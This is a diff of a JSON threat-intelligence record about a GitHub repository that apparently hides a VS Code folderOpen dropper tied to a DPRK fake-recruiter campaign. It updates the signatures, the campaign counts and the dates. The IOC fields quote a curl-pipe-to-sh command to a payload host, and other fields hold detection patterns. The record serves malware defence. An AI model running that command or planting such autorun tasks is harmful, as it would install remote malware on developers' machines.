@@ -17,12 +17,12 @@
     "evidence_locations": ".vscode/tasks.json:0; backend/middlewares/helpers/price.js:16; backend/middlewares/helpers/price.js:17; backend/middlewares/helpers/price.js:18",
     "c2_hosts": "vscode-bootstrapper.vercel.app",
     "iocs": "vscode-bootstrapper.vercel.app; https://vscode-bootstrapper.vercel.app/settings/mac?flag=307; https://vscode-bootstrapper.vercel.app/settings/linux?flag=307; curl 'https://vscode-bootstrapper.vercel.app/settings/mac?flag=307' | sh; .vscode/tasks.json",
-    "matched_signatures": "settings/linux?flag=; settings/mac?flag=; settings/windows?flag=",
-    "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'settings/mac?flag=', 'settings/windows?flag='] | Tier-2 confirmed (bash score 9)",
+    "matched_signatures": "folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T180103Z",
-    "last_seen": "hunt-20260925T180103Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/markomilivojevic_ethvault_staking.json",
     "reviewer_decision": "",
     "notes": ""
@@ -69,7 +69,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/markomilivojevic/ethvault_staking",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-bootstrapper.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-bootstrapper.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-bootstrapper.vercel.app.\nFound by GitHub code search for a confirmed malware signature: settings/linux?flag=; settings/mac?flag=; settings/windows?flag=.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-bootstrapper.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-bootstrapper.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-bootstrapper.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-bootstrapper.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: vscode-bootstrapper.vercel.app",
     "publisher": "markomilivojevic",
     "severity_level": "critical",
@@ -87,7 +87,7 @@
     "evidence_references": "https://github.com/markomilivojevic/ethvault_staking/blob/b774d56827feed0ef4aa5a27adb47df3dbdae4a1/.vscode/tasks.json\nhttps://github.com/markomilivojevic/ethvault_staking/blob/b774d56827feed0ef4aa5a27adb47df3dbdae4a1/backend/middlewares/helpers/price.js#L16\nhttps://github.com/markomilivojevic/ethvault_staking/blob/b774d56827feed0ef4aa5a27adb47df3dbdae4a1/backend/middlewares/helpers/price.js#L17\nhttps://github.com/markomilivojevic/ethvault_staking/blob/b774d56827feed0ef4aa5a27adb47df3dbdae4a1/backend/middlewares/helpers/price.js#L18",
     "verified_iocs": "vscode-bootstrapper.vercel.app\nhttps://vscode-bootstrapper.vercel.app/settings/mac?flag=307\nhttps://vscode-bootstrapper.vercel.app/settings/linux?flag=307\ncurl 'https://vscode-bootstrapper.vercel.app/settings/mac?flag=307' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T18:01:03Z",
-    "last_seen": "2026-09-25T18:01:03Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
